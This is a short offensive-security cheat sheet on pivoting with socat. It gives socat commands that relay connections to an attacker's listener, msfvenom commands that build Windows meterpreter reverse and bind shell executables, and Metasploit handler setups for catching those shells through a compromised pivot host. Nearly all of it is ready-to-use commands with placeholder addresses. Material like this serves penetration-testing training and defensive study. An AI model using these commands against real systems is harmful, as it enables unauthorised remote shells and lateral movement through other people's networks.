**Socat** is a network relay utility capable of linking two independent communication channels. It can listen on one interface and transparently forward traffic to another host and port without relying on SSH tunneling.


---
## Socat Redirection with a Reverse Shell
Socat can be used for pivoting connections, relaying reverse shells through an intermediary system, or bridging networks when direct connectivity to the attacker is not possible.    


### Starting a Socat Redirector on the Pivot Host

The pivot system listens on a reachable port and forwards any incoming connection to the attacker’s listener.

```bash
socat TCP4-LISTEN:[pivot_listen_port],fork TCP4:[attacker_ip]:[attacker_port]
```

**Meaning:**

- `pivot_listen_port` → Port opened on the pivot machine
    
- `attacker_ip` → Address of the attacker host
    
- `attacker_port` → Port where the attacker listener is running
    
- `fork` → Handles multiple simultaneous connections
    

### Creating a Reverse Shell Payload

The reverse payload must be configured to contact the pivot host, which will later relay the traffic.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=[pivot_internal_ip] \
LPORT=[pivot_listen_port] \
-f exe -o payload.exe
```

### Starting the Listener on the Attacker Host

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport [attacker_listener_port]
run
```

The handler waits locally while connections are redirected through the pivot.


---

## Socat Redirection with a Bind Shell

Socat can also be used to relay bind shells by forwarding connections from a pivot host to a service listening on an internal target. Instead of the target initiating the connection, the attacker connects to a listener running on the compromised system.


### Creating a Bind Shell Payload

Generate a payload that starts a listener on the target system.

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp \
LPORT=[target_bind_port] \
-f exe -o payload.exe
```

**Meaning:**

- `target_bind_port` → Port opened on the compromised target waiting for connections.

---

### Starting a Socat Redirector on the Pivot Host

The pivot listens locally and forwards traffic to the internal bind shell.

```bash
socat TCP4-LISTEN:[pivot_listen_port],fork TCP4:[target_ip]:[target_bind_port]
```

**Meaning:**

- `pivot_listen_port` → Port exposed on pivot host
    
- `target_ip` → Internal compromised machine
    
- `target_bind_port` → Bind shell listener on target


---

### Configuring the Metasploit Bind Handler

The attacker connects to the pivot listener, which relays traffic to the bind shell.

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST [pivot_host_ip]
set LPORT [pivot_listen_port]
run
```
